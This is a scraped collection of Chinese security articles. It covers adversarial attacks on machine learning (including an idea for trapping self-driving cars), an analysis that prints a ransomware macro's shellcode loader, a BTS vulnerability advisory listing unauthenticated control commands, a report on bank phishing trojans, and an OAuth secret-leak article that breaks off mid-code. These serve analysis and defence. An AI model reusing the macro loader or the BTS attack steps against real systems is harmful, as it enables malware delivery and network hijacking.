S从挂车底部通过时，其前挡风玻璃与挂车底部发生撞击，导致驾驶员不幸遇难。正如这起事件暴露出来的问题，当车身周围传感器和车前的毫米波雷达都失灵时(当然该案例中这传感器和毫米波雷达并未失灵，而是由于毫米波雷达安装过低，未能感知到底盘较高的卡车)，唯一能依靠的输入就是车窗前方的高清摄像头。我们来看看事发当时的街景现场以及被撞的卡车样式(注意白色车身上什么标致都没有)由于车前的高清摄像头为长焦镜头，当白色拖挂卡车进入视觉区域内的时候，摄像头只能看到悬浮在地面上的卡车中部，而无法看见整个车辆，加上当时阳光强烈(蓝天白云)，使得自动驾驶统无法识别出障碍物是一辆卡车，而更像是飘在天上的云。再加上当时特斯拉车主正在玩游戏，完全没有注意到前方的这个卡车，最终导致悲剧发生。结合刚才的图像识别对抗样本和浙大徐文渊教授团队的研究成果，我们完全有可能设计一个让自动驾驶系统发生车祸的陷阱，例如在某个车辆上喷涂吸收雷达波的涂料以及带有迷惑性的图案，让自动驾驶系统无法识别出前方的物体；再比如，找个夜深人静的夜晚在道路标识上加一些“噪音”，人类可以正常识别，而自动驾驶系统却会误判等等。0x06 邪恶的噪音与隐藏的指令除了容易被骗的图像识别系统，我们每个人手机上的语音助手同样不靠谱，也许未来某天你正在使用语音助手时，旁边突然传来一串奇怪的声音，你的手机就诡异的打开了某个挂马网站或者给一个完全不认识的人转账。来自加州大学伯克利分校的Carlini等人发现一些语言助手如`Google Now`和`Siri`都有可能理解一些人类无法辨识的“噪音”，并将其解析为指令进行执行。其实原理并不难理解，人工生成这种邪恶的噪音流程如下如图所示，这是一个反复迭代的过程。我们首先通过抽取正常语音中关键特征，再做一次“逆向特征”合成语音并加入一些噪音作为候选，并将其分别给语音识别系统和正常人播放试听，直到得到一个语音识别系统可以识别而人类无法辨识的邪恶噪音。0x07 思考与对策看完上文中提到的这些案例和分析，相信同学们有自己看法和认识。我也简单谈谈我个人的一些思考。1. 最基本的一点是不要迷信机器学习，不要觉得机器学习是解决一切问题的银弹。有的同学总觉得自己懂机器学习，那些靠人工上规则的办法就是low，这种就是典型的学术思维，真正在业务系统中纯粹靠机器学习算法硬上的迟早是要栽跟头的。只有抛开这种观念，从实际角度出发才能想出切实可行的方法。2. 尽量从多个数据来源或者多个特征维度综合分析。以随机域名生成算法为例，单靠域名本身的特征很难判断其是否为C&amp;C域名时，就应该从多个数据渠道入手进一步分析，如恶意软件家族的域名关联关系以及和某个可疑进程的通信行为等。3. 要有未雨绸缪的思维，在用机器学习算法解决一个问题的同时，应该从黑客猥琐的角度思考如何攻击这个算法，而不是简单的回避，为了解决问题而解决问题。4. 本文提到了对抗样本现象(图像识别、语音识别都有涉及)，目前学术界称之为**生成对抗网络(GAN, Generative Adversarial Networks)**，虽然目前还没有实际的攻击案例，但特斯拉的车祸其实已经敲响了警钟。就像著名黑客Barnaby Jack在Black Hat USA 2010上演示的针对ATM机的攻击，当时人们觉得非常科幻，现实中不一定存在这样的威胁，而今年发生的几起黑客攻击ATM机事件(`台湾第一银行ATM机遭黑客入侵 吐出7000万台币`、`泰国ATM机被入侵导致1200万泰铢被盗`)才让人们真正意识到原来这些看似只在电影的中发生的情节在真实世界中同样存在。当黑客都开始研究机器学习技术了，我们又有什么理由落后呢？参考资料1. [DeepDGA: Adversarially-Tuned Domain Generation and Detection]2. [Predicting Domain Generation Algorithms with Long Short-Term Memory Networks]3. [Intriguing properties of neural networks]4. [Explaining and Harnessing Adversarial Examples]5. [Deep Neural Networks are Easily Fooled: High Confidence Predictions for Unrecognizable Images]6. [Hidden Voice Commands]","2016-11-17 14:46:36","网络安全","安全领域中机器学习的对抗和博弈","http://nsoad.com/Article/Network-security/20161117/793.html"
"5ccbfb524f2f0a0a7a69c14f","简述在反病毒领域，CallWindowProc执行Shellcode的方法早在2009年就有过讨论，近期360QEX引擎团队发现有宏病毒首次使用该方法，传播敲诈者勒索软件。常见的宏病毒释放（下载","blackhold","简述在反病毒领域，CallWindowProc执行Shellcode的方法早在2009年就有过讨论，近期360QEX引擎团队发现有宏病毒首次使用该方法，传播敲诈者勒索软件。常见的宏病毒释放（下载） PE 文件，并执行的方法有：数据来源步骤：PE 数据来源网络（downloader），或数据来源自身病毒文档（dropper）；数据执行步骤：执行 PE 使用的方式 Application.Shell 或者 Wscript.shell 或者 Win32 CreateProcess。而最新出现的样本与上述方式方法不同，由宏代码生成内存数据（为shellcode，并非直接的 PE 文件数据），并利用CallWindowProc来执行Shellcode，由Shellcode完成后续操作。病毒样本：MD5: cec4932779bb9f2a8fde43cbc280f0a9SHA256: efd23d613e04d9450a89f43a0cfbbe0f716801998700c2e3f30d89b7194aff81样本详细分析源文档宏代码被混淆，并填充了垃圾代码，对宏代码进行简化后，如下，Private Declare Function VirtualAlloc Lib ""kernel32"" Alias ""VirtualAlloc"" (ByVal lpaddr As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPrivate Declare Function CallWindowProcA Lib ""user32"" Alias ""CallWindowProcA"" (lpPrevWndFunc As Long, hWnd As Any, Msg As Any, wParam As Any, lParam As Any) As LongPrivate Declare Sub RtlMoveMemory Lib ""ntdll"" Alias ""RtlMoveMemory"" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)  Private Sub Document_Open()    synecdochicEnd Sub  Sub synecdochic()    data_raw = chalcedony.turnstile    data_array_1 = boatswain.haircut(data_raw)      #If Win64 Then    Dim memory_base_address As LongPtr    #Else    Dim memory_base_address As Long    #End If    clethrionomys = 103 - 96 - 7      hate = 42 - 58 + 4112    memory_base_address = VirtualAlloc(clethrionomys, 4241, hate, &amp;H40)      Dim document_full_name As String    document_full_name = ActiveDocument.FullName      Dim data_array_2() As Byte    data_array_2 = data_array_1      RtlMoveMemory ByVal memory_base_address, data_array_2(0), UBound(data_array_2) + 1      #If Win64 Thenmemory_offset = 576#ElseIf Win32 Thenmemory_offset = 2214#End If   allmerciful = CallWindowProcA(ByVal memory_base_address + memory_offset, document_full_name, 0, 0, 0)  End Sub分析该宏代码，得到的执行步骤有，1、  获取窗体控件中预存的字符串数据；2、  进行数据解码；3、  申请内存空间，将数据以二进制形式复制到此内存空间；4、  使用 CallWindowProc 执行 shellcode （二进制数据）。步骤 4 a) 使用 CallWindowProc 执行二进制数据步骤 4 b) 从Windbg 查看 CallWindowProc 调用Shellcode分析二进制数据中同时存在32和64位的shellcode，32位的偏移于0x08A6，64位的偏移于0x0240处；下面以32位版本为例分析：首先，根据CallWindowProc调用shellcode时第二个参数为文档自身路径，Shellcode中打开文档，并在文档中寻找二进制标志串“50 4F 4C 41”，然后对标志后的0x142AC（图中硬编码）个字节进行第一次解码，解码算法是对每个字节先加3然后异或0x0D；第一次解码后的数据：Base 解码后的数据，从标志可以判断该二进制数据是一个PE：接着创建文件并写入解码后的数据，其文件路径为：32位下：""%TMP%\gg771.exe""64位下：""%TMP%\kt622.exe""文件释放完成后，调用API CreateProcessA创建进程：释放的PE文件MD5为： cc05867751b1de3cab89c046210faed4。安全建议鉴于近期宏病毒变种多携带敲诈者病毒通过垃圾邮件传播，更新频繁，影响恶劣，360安全专家建议用户打开杀毒软件实时防护，不随意点击垃圾邮件中的链接和附件。参考：1、https://github.com/decalage2/oletools2、http://www.freebuf.com/articles/web/11662.html3、http://m.2cto.com/kf/200908/40688.html4、https://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx","2016-08-22 19:52:17","网络安全","CallWindowProc被宏病毒利用来执行Shellcode","http://nsoad.com/Article/Network-security/20160822/326.html"
"5ccbfb524f2f0a0a7a69c150","最近，Zimperium实验室在对多个开源BTS（Base Transceiver Station）软件进行安全审计的过程中发现了多个漏洞，攻击者可以利用这些漏洞成功地入侵基站，导致基站无法正常工","kong","最近，Zimperium实验室在对多个开源BTS（Base Transceiver Station）软件进行安全审计的过程中发现了多个漏洞，攻击者可以利用这些漏洞成功地入侵基站，导致基站无法正常工作或者被远程控制。文章目录    MS（Mobile Station）BTS(Base Transceiver Station)影响的产品相关厂商安全分析防护建议声 明MS（Mobile Station）移动终端（MS）是移动用户的终端设备，可以分为车载型、便携型和手持型。其中手持型俗称“手机”。它由移动用户控制，与基站间建立双向的无线电话电路并进行通话。MS由两部分构成：Mobile Equipment(移动设备，ME)和Subscriber Identity Module(用户身份识别模块，SIM)。ME是指移动终端的具体设备。SIM是一个装在移动设备内部的智能小卡片，携带着移动设备使用者的信息，加密的密钥以及用户的电话簿等内容，可对GSM网络用户的身份进行鉴别，并对客户通话时的语音信息进行加密。BTS(Base Transceiver Station)基站（BTS）可以让移动电话连入GSM、UMTS和LTE等网络，由软件和无线电设备组成的。基站相当于Wi-Fi网络的无线接入点，负责Um接口的管理。Um是MS和BTS之间的接口,用于传输MS与网络之间的信令信息和业务信息。如下图所示。通过该接口，MS实现与网络端的通信，完成分组数据传送、会话管理、无线资源管理等多方面的功能。BTS的底层软件是一个信号收发器，它是无线电设备的直接接口，负责频率调谐和处理GMSK（Gaussian Filtered Minimum Shift Keying，高斯最小频移键控）数据的调制和解调。它完成无线电波到数字信号的转换。BTS其他逻辑单元的通信和同步，是由下图所示的三个UDP包完成的。上图中的Clock Socket负责时间同步；Command Socket用来完成BTS主逻辑模块向GSM通信模块的命令传送；Data Socket负责BTS主逻辑模块和GSM通信模块之间的数据传送。绝大多数BTS软件都会共用通信模块代码库，或者这些代码库之间非常相似，所以几乎所有这些BTS软件都会受到相同漏洞的影响。攻击者可以利用这些漏洞实现远程控制通信模块，实施伪基站代理攻击或者中间人攻击。攻击者还有可能向基站的GSM通信模块发送GSM数据包，对移动用户发起多种网络攻击，包括IMSI分离、加密降级、以及拒绝服务攻击等等。攻击者发送给基站的GSM通信模块的UDP数据包格式如下图：一旦基站的GSM通信模块收到这些数据包，便会进行解码，并且利用GMSK对这些数据进行调制，并发送到MS上。影响的产品YateBTS&lt;= 5.0.0OpenBTS&lt;= 4.0.0OpenBTS-UMTS&lt;= 1.0.0Osmo-TRX/Osmo-BTS&lt;= 0.1.10其他使用了相同信号收发器代码的产品相关厂商Legba股份有限公司（YateBTS）RangeNetworks（OpenBTS和OpenBTS-UMTS）OsmoCOM（Osmo-TRX和Osmo-BTS）安全分析漏洞一：宽松的服务绑定这个漏洞位于受影响产品的网络库中。这个问题会导致通信模块的UDPSocket地址绑定到0.0.0.0，而原本应该被绑定到的地址应该根据用户的设置而定（默认地址是127.0.0.1）。这个漏洞的存在将允许攻击者利用这些地址同BTS建立连接，并从通信模块中接收（或者发送）数据包。另外，访问暴露在这些UDP网络套接字上的服务，将没有任何身份验证机制的保护。攻击者可以建立IP连接，发送UDP数据包，获得BTS的所有功能，从而实现远程控制、GSM通信劫持、各种数据泄露、DOS拒绝服务或者其他后果更加严重的攻击。漏洞的根源在于UDPSocket类的构造器中。源文件CommonLibs/Sockets.cpp中的UDPSocket::open方法存在代码错误，这导致了漏洞的存在。所有受影响的产品中都包含这份源文件。含有漏洞的代码如下：从代码中可以看到，系统将绑定的地址保存到了mDestination类的成员变量中。然而UDPSocket::open方法的定义如下：虽然UDPSocket类提供了一个构造参数来指定服务器应该绑定到的IP地址，但是这个数据却被忽略了。如上图第291行代码所示，通信socket被绑定到了INADDR_ANY，而没有使用mDestination地址变量。漏洞二：缓冲区溢出（栈溢出） 攻击者可以向设备的控制信道发送一个超长的UDP数据包来引起栈缓冲区溢出，实现远程代码执行（RCE）或者对设备进行拒绝服务攻击。控制信道由源文件Transceiver.cpp中的Transceiver::driveControl方法进行管理。代码如下：代码中数据包的缓存空间位于函数栈中，其大小被定义为100字节（MAX_PACKET_LENGTH）。源文件Sockets.cpp中声明的DatagramSocket::read方法（DatagramSocket类是UDPSocket类的父类）的代码如下：可以看到，代码读取的长度是MAX_UDP_LENGTH，并非MAX_PACKET_LENGTH变量的值。而MAX_UDP_LENGTH的值是在Sockets.h源文件中定义的，如下图所示：因此，攻击者只需要向信号收发器发送一个大小超过100字节的UDP数据包，就可以成功在目标设备上引起缓冲区溢出。下图显示的是该漏洞所引发的错误调试信息：漏洞三：未经身份验证的远程控制控制信道并没有引入任何形式的身份验证机制。再加上“漏洞一”使得其部分信息暴露在了外部网络中，所以恶意攻击者就可以利用这个漏洞来远程控制信号收发器模块。攻击者可以进行如下的攻击：通过关闭模块来实现拒绝服务攻击。通过修改无线电信号频率来阻塞信号发送。通过“SETBSIC”命令远程劫持BTS。控制信道使用源文件Transceiver.cpp中的Transceiver::driveControl方法来处理UDP协议。该协议暴露的部分功能包括：开启或关闭TRX模块：CMDPOWERON / CMD POWEROFF更改TRX的无线频率：CMDRXTUNE frequency / CMD TXTUNE frequency设置GSM信号的验证信息：CMDSETBSIC value攻击者只需要向服务器的5701端口发送一个简单的UDP数据包，就可以远程执行上面这些控制命令了。关于协议的完整内容可以在TRXManager/README.TRXManager文件中找到。防护建议如果使用了受影响的软件/版本，请及时关注软件官方网站并更新到最新的版本或者使用替代软件。将用于控制操作和数据转换的socket地址绑定到本地接口（127.0.0.1）。阻止流经端口5701（控制端口）和端口5702（数据端口）的所有外部网络流量。引入身份验证系统，以防止没有权限的攻击者通过BTS控制端口来登录服务器或访问网络。修改存在缓冲区溢出风险的代码并进行重新编译。进行代码审计。使用绿盟科技防护类产品（ IPS/NF/SG）进行防护。已经购买了绿盟科技相关产品服务的客户可以通过产品升级进行检测与防护。短期服务：绿盟科技工程师现场处理。确保第一时间消除网络内相关风险点，控制事件影响范围，提供事件分析报告。中期服务：提供 3-6个月的风险监控与巡检服务。根除风险，确保事件不复发。长期服务：基金行业业务风险解决方案（威胁情报+攻击溯源+专业安全服务）。声 明本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。","2016-09-06 17:03:13","移动安全","BTS软件漏洞或可劫持手机通讯基站安全威胁通告","http://nsoad.com/Article/MobileSecurity/20160906/359.html"
"5ccbfb5c4f2f0a0a7a69c151","随着科技的不断发展，企业也逐渐开始在自身的业务处理流程中引入云计算、移动办公、物联网、以及大数据等新兴技术了。由于这种数字化的发展势头非常迅猛，所以企业就需要","blackhold","随着科技的不断发展，企业也逐渐开始在自身的业务处理流程中引入云计算、移动办公、物联网、以及大数据等新兴技术了。由于这种数字化的发展势头非常迅猛，所以企业就需要有人来保护这些系统的安全性，因此企业对于网络安全人才的需求也显得愈发的强烈。网络安全市场的发展现状根据PwC、CIO和CSO在本月联合发布的2017年全球信息安全状况调查（GSISS）报告显示：直至目前为止，资深的网络安全专家仍然是一种稀缺资源，而这也使得全球各大企业或组织的信息安全正面临着巨大的挑战。据了解，很多企业正在尝试通过第三方安全管理服务来缓解目前安全人才缺失所带来的影响。根据调查报告提供的数据，目前大约有62%的企业需要依赖于第三方安全服务提供商来保护企业网络系统的安全。美国信息安全培训公司SANS的负责人JohnPescatore在接受采访时表示：“实际上，当你选择向安全托管服务提供商（MSSP）寻求帮助的时候，重点也就变成了你到底选择相信谁。安全托管服务市场每年都在以10%到15%的年复合增长率在发展。而且需要注意的是，在相当长的一段时间里MSSP市场一直都在以这个增长速度在发展。所以，安全托管服务市场的发展并不是爆炸性的，而是一种长期稳定的发展。”目前很多企业或组织都开始将自身业务转移到云端，而BYOD（携带自己的设备办公）的情况也越来越普遍了。因此，当企业开始考虑如何去应对这种变化所带来的安全威胁时，他们往往就会发现自己并没有处理这种安全问题的能力，而聘请那些有能力的人通常又需要花费大量的金钱。因为如果你想要从其他公司挖来网络安全人才的话，你所提供的薪水至少要有竞争力才行。所以我建议各大企业，如果有可能的话，尽量将这些安全防护任务外包给第三方的服务商，这也是弥补当前企业内部安全技术空白的一种方式。”根据研究人员针对MSSP的市场调研报告，如果安全托管服务市场每年能够以10%到15%的年复合增长率发展的话，到2021年，网络安全服务市场的规模将达到2020亿美元。实际上，目前MSSP的市场规模已经达到了1220亿美元，如果以每年10.6%的增长率发展的话，想要在2021年达到这个庞大规模其实并不是难事。这份报告指出，在同一发展时期内，应用程序安全市场的发展势头在安全领域内可以算是最为迅猛的了。其中航空航天部门购买安全服务的比例是最高的，其次就是政府部门、公共事业部门、电信企业、以及通信企业。云安全厂商CloudPassage的联合创始人兼首席技术官CarsonSweet在接受采访时表示：“行业竞争的巨大压力也是企业选择安全外包服务的重要原因之一，将安全防护任务转交给第三方服务提供商之后，企业就可以将工作重点放在自己的核心业务上了。实际上，很多企业在处理工作邮件和客户关系上基本采用的是相同的策略，因此他们可以直接将这类业务的安全防护外包给第三方服务提供商，而企业之间的区别主要体现在内部资源与核心技术上。”GSISS调查报告指出，正是由于第三方安全服务提供商的存在，所以现在的企业在处理安全问题时才不会手忙脚乱。目前，很多第三方安全服务提供商可以帮助企业对用户身份进行验证、防止数据丢失、管理用户访问、以及实时监控与安全分析，并且可以及时向企业提供安全威胁情报。理论上，“将企业的信息安全外包给第三方服务商”这种应对方案可以把网络安全当作一种可交易的商品来对待。企业可以把“保护网络安全”的重任交给第三方安全服务商，而安全服务提供商可以聘请专业的安全研究专家为各大企业提供7×24小时的安全运维服务。这样一来，企业就可以将自身资源集中在其他的业务上了。Pescatore补充说到：“像金融机构、电子商务网站、以及数字化公司这样的企业对于网络安全的要求是非常高的，在处理这类安全敏感性企业的安全问题时不能直接套用“一站式”的安全解决方案。这类企业需要在关键业务处理流程以及敏感数据（或算法）上部署严格的安全防护措施和安全警报。所以对于这类企业而言，聘请专业的安全技术人员也许是最佳的选择。”安全服务公司SkyportSystems的首席执行官ArtGilliland在接受采访时表示：“很多企业一开始其实并不愿意将自身的网络安全保护任务外包给第三方安全服务商，但是当他们发现自己无法去应对这些安全问题的时候，他们又会重新转投MSSP的怀抱。但是对于第三方安全服务提供商而言，他们目前所面对的挑战就是无法清晰地了解目标企业当前的网络情况，因此他们只能够给企业提供“普适性”的安全服务。”","2016-11-12 13:05:38","安全管理","信息安全人才依旧奇缺，企业真的无人可用了吗？","http://nsoad.com/news/securityissue/20161112/754.html"
"5ccbfb5c4f2f0a0a7a69c152","一、背景据“第十五次全国信息网络安全状况暨计算机和移动终端病毒疫情调查”调查结果显示，2015年移动终端的病毒感染比例为50.46%，相对于2014年增长了18.96%，","blackhold","一、背景据“第十五次全国信息网络安全状况暨计算机和移动终端病毒疫情调查”调查结果显示，2015年移动终端的病毒感染比例为50.46%，相对于2014年增长了18.96%，移动终端病毒感染率涨幅较大，其主要原因在于不法分子瞄准手机支付用户群体，利用钓鱼网站、仿冒移动应用、移动互联网恶意程序、伪基站等多种手段，实施跨平台的欺诈和攻击。以下，安天AVL移动安全团队（以下简称AVLTeam）将以银行用户为对象，针对仿冒钓鱼类攻击进行详尽的威胁分析并提出可采取的防范策略。二、威胁分析为了提高欺诈和钓鱼的成功率，达到诱骗用户的攻击目的，攻击者采用了大量的各类伪装和仿冒技术，当前针对银行用户的仿冒攻击模式主要分为以下四种：1.   钓鱼网站和短信2.   仿冒官方应用图标3.   仿冒官方应用程序名4.   仿冒官方应用界面1.钓鱼网站和短信针对银行用户，攻击者会在攻击武器化阶段准备大量类似或相仿的域名和网站界面，在攻击投放阶段通过钓鱼短信进行攻击，从而达到欺诈银行用户的目的，并通过仿冒银行网站来窃取用户银行卡账号及密码等相关信息，同时诱导银行用户进行虚拟付款验证，最终通过获得用户手机验证码来窃取用户资金。攻击流程如下图所示：a.  钓鱼网站据AVL Insight移动威胁情报平台数据统计，银行相关的钓鱼网站数据截止到2016年8月总计为941188，TOP10的仿冒对象按下图所示：（单位：个）从图中可以看出，受影响程度排名靠前的均为国内知名度高、用户范围广的大型银行。 下图为分别为建设银行、招商银行和工商银行的手机钓鱼网站界面：在威胁攻击武器化阶段，钓鱼网站作为主要的攻击工具，也早已产业化，下图为AVL Team与钓鱼网站卖家的对话：b.  钓鱼短信    短信是银行、金融、第三方支付、交易系统等与用户进行信息沟通的重要介质，同时也是攻击者在欺诈和攻击渗透环节使用的重要工具。钓鱼短信通常包含多种信息，例如：短信的来源号码，短信中包含的称呼内容，短信中的文字语义内容和短信中所包含的URL等。伪基站作为投放的工具，被广泛应用，工具化的伪基站不仅可以自定义短信内容，还可以自定义显示号码、发送时间等具有伪装性特点的信息。下图为伪基站系统示例：查询AVL Insight移动威胁情报平台中TTP涉及银行类数据源，并参考银行类伪基站短信记录信息，总结出仿冒银行短信主要为以下几类：c.   行为模式及攻击实例    综上所述，针对银行用户的攻击，钓鱼短信和仿冒银行URL等行为，一般会通过仿冒银行网站来窃取用户银行卡账号和密码等相关信息，并且诱导银行用户进行虚拟付款验证，从而获得用户手机验证码来窃取用户资金。其主要的攻击行为模式为以下三个过程：下图为攻击的截图示例：正常情况下，如果不泄漏支付验证码是可以避免资金被窃取的，但值得注意的是，如果用户的银行账号、银行账号密码、银行预留手机号和姓名等重要信息被泄漏，也可能会被恶意攻击者用来定向攻击：1.     定向投放木马（相册、请帖等拦截马）2.     电信诈骗、同时我们还发现，攻击者获得银行用户账户资料后，还会进行出售倒卖，下图为某钓鱼网站域名（wap.ybckcb.cc）所有者的QQ，该QQ从2010年就开始进行银行卡账户资料倒卖活动。2.仿冒官方应用图标通过AVL Insight移动威胁情报平台搜索含“银行”的应用名的图标可以发现，截止到2016年8月针对银行的仿冒图标多达817个。仿冒图标数量top10的程序名如下:（单位：个）对特定银行应用图标仿冒情况分析如下：3.仿冒官方应用程序名根据AVL Insight移动威胁情报平台应用数据，检索仿冒“银行”程序名的恶意应用，发现近7天感染用户405人。仿冒的银行应用和恶意代码TOP10如下：4.仿冒官方应用界面据AVL Team统计，针对银行用户的攻击有39个恶意家族和84个变种。下图为2016年1月至7月受感染设备量：下图为2016年1月至7月受感染设备地域分布：仿冒银行类木马Fakewf.a最早在2012年3月8日发现，其仿冒的是Wells Fargo银行的web界面。后续相继出现的木马emial、FakeBank、Googlessms、kaka、Perkel 、SmsZombie、E4Aspy、Sberik、Slocker这几大家族及其变种都存在仿冒银行行为（主要仿冒登录界面和支付界面），有些甚至直接仿冒银行相关应用。（1）通过仿冒应用登陆界面窃取银行账户数据例如Trojan/Android.E4Aspy.c[prv,fra]仿冒银行登录界面，窃取用户账号相关信息，包括：银行账号、银行账号密码、银行预留手机号、身份证号码、开户行名称、支付宝账号和支付宝密码等。不仅如此，该木马还会窃取用户手机隐私信息，包括：手机型号、通话记录、收件箱短信、已发送短信、未阅读短信、已阅读短信、通讯录、GPS检测、短信箱内容、通话记录、通讯录、系统版本、本机型号、当前所在纬度和当前所在经度等。（2）通过劫持登陆界面窃取银行账户数据这类恶意应用通常伪装成大众常见的应用，诱导用户安装，运行后隐藏图标，在后台监听银行应用进程，当用户在进行登陆操作时，恶意应用会通过顶层窗口覆盖银行应用登陆窗口的方式来劫持登陆，当用户在攻击者伪造的银行登陆界面登陆时，银行账户数据就会被攻击者窃取。常见的伪装应用名有：Adobe Flash Palyer、Flash Player、MMS Messaging、WhatsApp。相对于单纯的仿冒银行应用界面来讲，通过劫持登陆窗口的方式目的性更强，主要通过攻击银行应用来窃取银行账户数据，在界面仿冒方面多以HTML来布局，这种攻击方式更加灵活隐蔽（适用于：安卓系统版本低于5.0）。下图为攻击截图示例：三、威胁趋势当前国内针对银行应用的仿冒多以图标、应用名和界面仿冒为主，国外则多以界面劫持为主，其TTP攻击模式（TTP即Tactic、Technique和Procedure，包括攻击者的行为、利用的资源和目标受害者的信息等，主要通过标准语言来多细节地描述攻击者的行为）如下：a.  图标、应用名和界面仿冒该类恶意行为通常都会根据远程服务器指令控制下载恶意子包，从图标、应用名和界面来仿冒银行软件。b.  假冒银行应用该类恶意行为通常从图标、界面来仿冒银行应用，并通过钓鱼形式窃取用户账户密码等信息通过网络上传给攻击者。c.  界面劫持该类恶意行为通常会根据远程服务器指令控制劫持指定银行的登录或者注册界面，弹出假冒的钓鱼页面用来窃取用户的账户密码等信息，并通过网络上传给攻击者。通过统计近两个月的受威胁用户信息，可以发现盗取隐私最多的邮件TOP10如下图，TOP1的邮箱窃取了4万多条的隐私数据，占了将近总量的一半；另外这些受害者感染的基本都属于拦截马emial家族传播，传播最广泛的emial.bw变种有7万多个受威胁用户信息。另外统计受威胁用户地域分布如下，以北京、湖北、广东为最： 此外，银行类的潜在受威胁用户数量情况如下： 通过对银行类的潜在受威胁用户被泄露的隐私数据进行分析可知，至少有50家不同银行的用户都遭受过“短信拦截木马”威胁的攻击，其中除了商业银行以外，还包含了各个地区的地方银行；除此之外使用银联、支付宝、微信支付和京东支付的用户也存在信息被泄露的风险。四、结语随着黑产经济能力积累和技术能力的增强，银行的基础设施和业务主体遭受攻击的风险将会大大增加。目前在世界范围也都出现了非常广泛的利用移动恶意代码对金融行业进行攻击的现象，当然境内和境外还存在较大的环境差异性。中国是一个有7亿网民的互联网大国，其中多半使用智能终端，哪怕是非常小的比例用户遭到感染，也会形成一个很大的感染数量。并且攻击者多将矛头指向国内用户基数高、知名度大的中大型银行，这就导致大量的受害人遭受财产损失，并可能连带引发关联的社会问题。为了避免更多的受害用户遭受仿冒钓鱼类威胁攻击以及将受害用户的损失降到最低，通常我们可以采用的行动策略主要有：1. 通过联合职能部门和运营商，增强对威胁投放渠道的监测和阻断；通过和安全厂商紧密协作，形成有效合理的处置手段，避免盲目处置。2. 银行、金融相关公司增强对此类安全威胁的重视，结合威胁情报，加强联合防御和处置。3. 通过对攻击者的进一步回溯和分析，对攻击链路上不同环节的攻击者进行有效的打击和追溯。* 作者：AVLTeam（企业账号），转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）","2016-08-30 19:17:13","移动安全","Dark Mobile Bank之移动银行应用仿冒攻击威胁分析报告","http://nsoad.com/Article/MobileSecurity/20160830/334.html"
"5ccbfb5c4f2f0a0a7a69c153","前情提要上期关键词回顾：网民吐槽的场景、障眼法的病毒、给他人做嫁衣的开发团队、见招拆招的乐固上期阅读链接：[移动 APP 安全揭秘]第一期——泛滥的盗版前言往","Kong","前情提要上期关键词回顾：网民吐槽的场景、障眼法的病毒、给他人做嫁衣的开发团队、见招拆招的乐固上期阅读链接：[移动 APP 安全揭秘]第一期——泛滥的盗版前言往事再现两年前新加坡南洋理工大学一位名叫 Wang Jing 的博士生，发现了 OAuth 和 OpenID 开源登录工具的“隐蔽重定向”漏洞(Covert Redirect)，博足了全世界眼球，也被一些安全研究人员研究出了各种猥琐利用的方式（参看知乎专栏：优主张，OAuth 相关文章），能随意进出各大社交网站的用户主页，当时不少媒体以为是 OAuth 这个协议的问题，而实际 OAuth 这个协议本身是没有问题的，之所以存在问题是因为各个厂商没有严格参照官方文档，只实现了简版。本期精彩而 OAuth2.0 协议是目前被第三方登录服务商广泛采用的一个用于第三方授权的协议，有了上述的往年经验，第三方服务商在提供第三方登录服务时，也大多考虑到了可能存在的攻击面，因此更多的攻击点在 APP 自身。继上期移动 APP 行业安全概况介绍后，本期我们跟大家重点讲讲 APP 中不安全的第三方登录实现方式，如何发现、如何避免 Appsecret 泄露（类似于授权密钥） 等，从而避免用户信息泄露，以及又将如何修复。受开发者欢迎的第三方登录是什么？现在市面上越来越多的 APP 或者 Web 应用都提供了第三方登录的功能，如通过微博、微信、QQ 登录等，用户只需要在对应的 APP 上选择授权就可以一键登录。比起传统的账号密码注册登录流程，第三方登录减少了很多繁琐的操作和流程，降低了注册和登录门槛，并且更有安全保障，所以也很受开发者的欢迎。然而即使第三方登录安全性已有保障，但正如木桶理论所说，决定产品安全性的往往是一些“短板”，如开发者对授权流程的错误理解，不正确的实现方式等。完整的第三方登录流程与所使用的 OAuth 2.0 协议    OAuth2.0 协议是目前广泛被采用的一个用于第三方授权的协议，具体的协议 RFC 文档可参看https://tools.ietf.org/html/rfc6749 比起曾经的 OAuth1.0a 协议，OAuth2.0 更加简单清晰，同时加密方式依赖https的可信传输而非 OAuth1.0a 的 Token 签名加密，同时提供了多个途径如授权码、刷新令牌等去获取访问 Token 令牌，适用场景更广。因此国内的第三方登录服务商也大多使用或参考了 OAuth2.0 协议的实现方式。例如某知名社交 APP 的授权流程：由上图可以看到一次完整的第三方登录流程涉及到了三方：用户，第三方登录服务提供者(如微博、微信、QQ等)，APP 应用自身。任何一方如果出现了安全薄弱点，则会击溃整个安全认证体系。实际上 OAuth2.0 协议在设计时已经考虑到了可能存在的攻击面，并且也提供了相应的应对建议https://tools.ietf.org/html/rfc6819第三方服务商在提供第三方登录服务时，也大多考虑到了这些存在的风险，因此更多的攻击点在 APP 自身。接下来本文介绍一种 APP常见的漏洞：Appsecret、Access_Token 泄露。APP 用户信息泄露的根源之Appsecret、Access_Token 泄露开发者在类似微博应用开发平台、微信开放平台注册应用后，平台一般会给开发者颁发 Appid、Appsecret 这两个字段，这个是应用的唯一标示，使用这两个字段的目的主要是确保应用是开发者本人在使用。同时这种第三方开放平台还会开放给开发者不同的 API 接口，可以进行一些授权的操作行为，如发微博、加关注、微信关注者管理、推送公共号消息等，这些都需要开发者在访问请求 API 时，带上 Appid、Appsecret 或者 Access_Token 字段。△ 获取 Access_Token△ 获取关注用户信息所以如果这两个字段任意一个泄漏、那么就会泄漏很多用户相关信息、并且可进行敏感操作。 既然 Appid、Appsecret 如此重要，想必开发者们应该相当重视其保密性吧，实则不然，由于用户登录授权时需要使用到 Appid、Appsecret，很多第三方 APP 开发者为了使用方便，会将这两个字段写死在代码里面，在用户授权之后，则在 APP 本地将 Code、Secret 等字段拼接并请求第三方登录后台。这种常见的错误实现方式如下图：错误实例代码private String url = ""https://api.weixin.qq.com/sns/oauth2/access_token?"";private WxEntity wx;this.code = 